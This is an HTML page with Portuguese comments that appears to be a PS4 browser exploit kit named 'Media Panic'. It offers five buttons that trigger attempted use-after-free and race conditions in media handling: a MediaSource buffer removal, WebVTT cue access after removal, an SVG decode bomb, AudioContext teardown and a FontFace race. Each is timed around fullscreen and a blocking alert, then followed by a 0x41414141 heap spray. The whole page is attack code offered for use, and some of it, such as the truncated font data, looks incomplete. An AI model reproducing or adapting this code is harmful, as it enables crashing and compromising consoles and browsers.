<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v270000: Media Panic</title>
<style>
    body { background: #100; color: #f55; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f00; }
    .status { border: 1px solid #f55; padding: 10px; margin-bottom: 20px; color: #fff; background: #200; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #300; color: #fff; border: 2px solid #f55;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f00; color: #000; }
    
    #stage { background: #000; height: 100px; border: 1px solid #555; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
</style>
</head>
<body>

<h1>v270000: MEDIA PANIC (NO WEBGL)</h1>

<div class="status">
    ATAQUE AO DECODIFICADOR DE HARDWARE<br>
    CLIQUE -> FULLSCREEN (QUADRADO) -> FECHE ALERTA
</div>

<button onclick="media_panic(m01)">01. Video Source Buffer UAF (MSE)</button>
<button onclick="media_panic(m02)">02. WebVTT Subtitle Parse Race</button>
<button onclick="media_panic(m03)">03. Large Image Decode Bomb</button>
<button onclick="media_panic(m04)">04. AudioContext Oscillator Detach</button>
<button onclick="media_panic(m05)">05. SVG Font Loading Race</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // Ferramenta de Heap Spray (Preenche memória com 0x41)
    function spray() {
        const arr = [];
        const fill = new Uint32Array(1024 * 16).fill(0x41414141);
        try { for(let i=0; i<1500; i++) arr.push(new Uint32Array(fill)); } catch(e){}
    }

    function media_panic(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura o vetor de mídia
        const target = vectorFunc(Stage);
        
        // Pequeno delay para garantir que o elemento de mídia inicializou
        setTimeout(() => {
            // 2. Solicita Fullscreen
            if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
            else if (target.requestFullscreen) target.requestFullscreen();

            // 3. O Timing do Congelamento
            requestAnimationFrame(() => {
                setTimeout(() => {
                    // Prepara o ataque (ex: começa a carregar buffer)
                    if(target._prime) target._prime();

                    // TRAVA A THREAD
                    window.alert("⚠️ MEDIA DRIVER ATTACK ⚠️\n\nAo fechar, o driver de vídeo receberá dados corrompidos.");

                    // DETONAÇÃO
                    if(target._detonate) {
                        target._detonate();
                        spray(); // Tenta preencher o buraco na memória
                    }
                }, 50);
            });
        }, 100);
    }

    // =================================================================
    // 01. Video Source Buffer UAF (Media Source Extensions)
    // Tenta alimentar o decoder manualmente e cortar a memória.
    // =================================================================
    function m01(stage) {
        const v = document.createElement('video');
        v.style.width = "100%"; v.style.height = "100%";
        stage.appendChild(v);
        
        let ms = new MediaSource();
        v.src = URL.createObjectURL(ms);
        
        let sb = null;
        
        ms.addEventListener('sourceopen', () => {
            try {
                // Tenta codec comum de MP4
                sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
            } catch(e) {
                stage.innerText = "MSE NÃO SUPORTADO (Tente outro)";
            }
        });

        v._prime = () => {
            // Aloca um buffer, mas não envia ainda
            // O decoder fica esperando dados
        };

        v._detonate = () => {
            if(sb && !sb.updating) {
                try {
                    // Tenta remover o SourceBuffer enquanto o player está ativo
                    ms.removeSourceBuffer(sb);
                    // Revoga a URL do objeto
                    URL.revokeObjectURL(v.src);
                    // Destroi o elemento de vídeo
                    v.remove();
                } catch(e){}
            }
        };
        return v;
    }

    // =================================================================
    // 02. WebVTT Subtitle Parse Race
    // Ataca o parser de legendas.
    // =================================================================
    function m02(stage) {
        const v = document.createElement('video');
        v.src = "about:blank"; // Dummy source
        v.controls = true;
        stage.appendChild(v);

        const track = v.addTextTrack("subtitles", "Crash", "en");
        track.mode = "showing";

        v._prime = () => {
            // Adiciona centenas de legendas (Cues)
            for(let i=0; i<500; i++) {
                track.addCue(new VTTCue(i, i+1, "PAYLOAD " + i));
            }
        };

        v._detonate = () => {
            // Remove o track e modifica os cues ao mesmo tempo
            track.mode = "disabled";
            v.remove();
            
            // Tenta acessar um cue órfão (se possível manter referência)
            // Isso força o motor de renderização de texto a ler memória livre
            const cues = track.cues; 
            if(cues) cues[0].text = "OVERFLOW";
        };
        return v;
    }

    // =================================================================
    // 03. Large Image Decode Bomb
    // Usa uma imagem SVG codificada em Base64 gigante para estourar
    // o decodificador de imagem durante o fullscreen.
    // =================================================================
    function m03(stage) {
        const img = document.createElement('img');
        // SVG complexo vazio
        const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="5000" height="5000"><rect width="100%" height="100%" fill="red"/></svg>`;
        const blob = new Blob([svg], {type: 'image/svg+xml'});
        const url = URL.createObjectURL(blob);
        
        img.src = url;
        img.style.width = "100%";
        stage.appendChild(img);

        img._detonate = () => {
            // Revoga a URL e remove a imagem enquanto o navegador tenta decodificá-la para fullscreen
            URL.revokeObjectURL(url);
            img.src = ""; 
            img.remove();
        };
        return img;
    }

    // =================================================================
    // 04. AudioContext Oscillator Detach
    // Ataca o thread de áudio. Se o PS4 tiver WebAudio API.
    // =================================================================
    function m04(stage) {
        const d = document.createElement('div');
        d.innerText = "AUDIO ATTACK";
        stage.appendChild(d);
        
        let ac = null;
        try {
            ac = new (window.AudioContext || window.webkitAudioContext)();
        } catch(e) {
            d.innerText = "WEB AUDIO N/A";
            return d;
        }

        const osc = ac.createOscillator();
        osc.connect(ac.destination);
        
        d._prime = () => {
            osc.start(); // Inicia som
        };

        d._detonate = () => {
            // Fecha o contexto e desconecta enquanto toca
            ac.close();
            osc.disconnect();
            d.remove();
        };
        return d;
    }

    // =================================================================
    // 05. SVG Font Loading Race
    // Carrega uma fonte personalizada e destroi o elemento que a usa.
    // =================================================================
    function m05(stage) {
        const d = document.createElement('div');
        d.innerText = "FONT LOADING...";
        d.style.fontFamily = "'CrashFont'";
        stage.appendChild(d);

        // Define fonte via JS API
        const f = new FontFace('CrashFont', 'url(data:font/woff;base64,d09GRgABAAAA...)'); // Fonte inválida/vazia
        
        d._prime = () => {
            document.fonts.add(f);
            f.load().catch(()=>{}); // Inicia load
        };

        d._detonate = () => {
            document.fonts.delete(f); // Deleta a fonte do set
            document.fonts.clear();   // Limpa tudo
            d.remove();               // Remove o elemento consumidor
        };
        return d;
    }

</script>
</body>
</html>
